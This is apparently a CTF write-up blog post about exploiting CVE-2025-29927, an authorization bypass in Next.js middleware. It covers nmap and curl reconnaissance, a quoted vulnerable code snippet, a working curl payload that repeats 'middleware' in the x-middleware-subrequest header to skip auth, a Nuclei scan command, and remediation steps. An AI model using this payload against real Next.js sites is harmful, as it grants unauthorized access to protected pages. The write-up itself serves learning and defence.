---
title: "CTF Writeup: The Next.js Middleware Phantom"
date: 2026-02-01 20:30:00 +0500
categories: [CTF, Web]
tags: [nextjs, cve-2025-29927, auth-bypass, red-team, reconnaissance]
---

# CTF Writeup: Next.js Middleware Auth Bypass (CVE-2025-29927)
**Difficulty:** Hard | **Platform:** Local Server | **Date:** January 2025

# 1. Executive Summary
This is how a "simple" web challenge turned into a 2-hour battle against my own assumptions. I was tasked with breaking into a modern Next.js 15.2.2 application. While I initially struggled with network instability and my own lack of experience with modern JS routing, I eventually successfully exploited CVE-2025-29927. By manipulating the x-middleware-subrequest header, I tricked the bouncer into letting me straight into the admin dashboard without a password.

# 2. Reconnaissance & Enumeration: The Fog of War
## 2.1. Fighting the Environment
The engagement started on a frustrating note. My internet was being incredibly inconsistent, and the challenge server seemed to be hanging. Every time I ran a scan, I faced consistent timeouts and server failures. I initially thought the server was just underpowered for the CTF traffic, but it turned out my own latency was dropping critical packets.

The Lesson: I had to pivot my strategy. Instead of aggressive multi-threaded scanning, I slowed down my nmap timing and increased the retry count just to get a stable read on the services.

## 2.2. Identifying the Stack
Once the connection stabilized, a standard nmap scan revealed Port 3000 was open. A quick curl -I confirmed my target:

Header: X-Powered-By: Next.js

Behavior: Accessing the root or /dashboard immediately triggered an HTTP 307 Temporary Redirect to /login.

## 2.3. The Rabbit Hole (Where I Failed)
Because I lacked deep experience with Next.js internals at the time, I fell into a classic "tunnel vision" trap. I spent hours fuzzing the /login page for SQL injection and attempting to forge JWT tokens for the session cookie. I was attacking the application logic when the flaw was actually in the framework's routing architecture.

# 3. Vulnerability Analysis: The Internal Header Flaw
## 3.1. The Turning Point
After my "standard" web attacks failed, I stepped back to research framework-specific vulnerabilities for Next.js 15.x. I came across CVE-2025-29927, an authorization bypass discovered by Rachid Allam (zhero).

The vulnerability revolves around an internal header: x-middleware-subrequest. Next.js uses this to prevent infinite loops when middleware calls itself. If this header is present with a specific value, the framework assumes the middleware has already executed and skips it entirely.

## 3.2. Code-Level Logic
I analyzed the vulnerable code snippet from the research:

JavaScript
const subreq = params.request.headers["x-middleware-subrequest"];
const subrequests = typeof subreq === "string" ? subreq.split(":") : [];

// If the bouncer thinks I've already been checked, it lets me in.
if (subrequests.includes(middlewareInfo.name)) {
  result = {
    response: NextResponse.next(),
    waitUntil: Promise.resolve(),
  }
  continue;
}

# 4. Exploitation & Initial Access
## 4.1. The Setup
To make sure I wasn't chasing a ghost, I spun up a local reproduction environment using Docker to test my theory:

Bash
docker compose up -d

## 4.2. Initial Failure
My first attempt at the exploit on the actual CTF target failed. I tried a simple header: x-middleware-subrequest: middleware

Result: Still got redirected. I realized that in versions 13.2.0 and later, Next.js implements a recursion depth check. A single "middleware" string wasn't enough to satisfy the logic in this specific environment.

## 4.3. The "Skeleton Key" Payload
I refined my payload to use a repeated string. This bypasses the recursion depth logic by making the request look like it has already "looped" through the security check multiple times.

The Command:

Bash
curl -i -H "x-middleware-subrequest: middleware:middleware:middleware:middleware:middleware" http://[TARGET_IP]:3000/
The Breakthrough: The server returned an HTTP/1.1 200 OK. The middleware was successfully silenced. I could now see the dashboard content and the flag without a single credential.

# 5. Automation: Scaling the Attack
To ensure I could detect this across the rest of the target assets, I used the Nuclei template. This template checks for the presence of _next/static, identifies middleware-protected endpoints, and then attempts the x-middleware-subrequest injection automatically.

Bash
nuclei -u http://[TARGET_IP]:3000 -t cve-2025-29927.yaml -vv

# 6. Conclusion & Remediation
This challenge was a massive wake-up call. My initial failures were due to treating a modern React framework like a legacy PHP app.

For the Blue Team:

Update: Immediately upgrade to Next.js 14.2.25 or 15.2.3.

WAF Mitigation: Configure your load balancer or Nginx to strip the x-middleware-subrequest header from all external incoming requests.

For the Red Team:

Always check /_next/static to map out the internal project structure.

Don't trust the bouncer; sometimes you can just tell them you've already been inside.
